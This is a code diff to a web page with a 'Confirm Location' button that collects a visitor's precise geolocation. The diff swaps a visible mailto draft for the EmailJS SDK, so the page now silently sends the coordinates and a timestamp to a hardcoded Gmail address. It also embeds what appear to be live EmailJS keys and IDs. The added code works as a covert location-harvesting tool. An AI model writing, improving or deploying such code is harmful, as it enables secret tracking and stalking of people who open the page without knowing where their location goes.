@@ -35,11 +35,18 @@
     <button onclick="getLocation()">Confirm Location</button>
     <p id="result"></p>
 
+    <!-- Add EmailJS SDK -->
+    <script src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
     <script>
+        // Initialize EmailJS with your Public Key
+        (function(){
+            emailjs.init("BlJiNbBptTiCjJ_qj"); // Replace with your EmailJS Public Key (e.g., user_123456789)
+        })();
+
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendPosition, showError, {
-                    enableHighAccuracy: true, // High accuracy for mobile
+                    enableHighAccuracy: true,
                     timeout: 10000,
                     maximumAge: 0
                 });
@@ -54,11 +61,22 @@
             const result = `Location: Latitude ${latitude}, Longitude ${longitude}`;
             document.getElementById("result").innerHTML = result;
 
-            // Send to email
-            const email = "misofiko3@gmail.com"; // Replace with your email
-            const subject = "New User Location";
-            const body = `Latitude: ${latitude}\nLongitude: ${longitude}\nTime: ${new Date().toLocaleString()}\nGoogle Maps Link: https://www.google.com/maps?q=${latitude},${longitude}`;
-            window.location.href = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+            // Send email using EmailJS
+            const params = {
+                latitude: latitude,
+                longitude: longitude,
+                time: new Date().toLocaleString(),
+                to_email: "misofiko3@gmail.com" // Replace with your email (e.g., your-email@gmail.com)
+            };
+
+            emailjs.send("service_p3gxlas", "template_tifp0tj", params)
+                .then(function(response) {
+                    console.log("Email sent successfully!", response);
+                    document.getElementById("result").innerHTML += "<br>Email sent to your inbox!";
+                }, function(error) {
+                    console.log("Failed to send email:", error);
+                    document.getElementById("result").innerHTML += "<br>Failed to send email.";
+                });
         }
 
         function showError(error) {
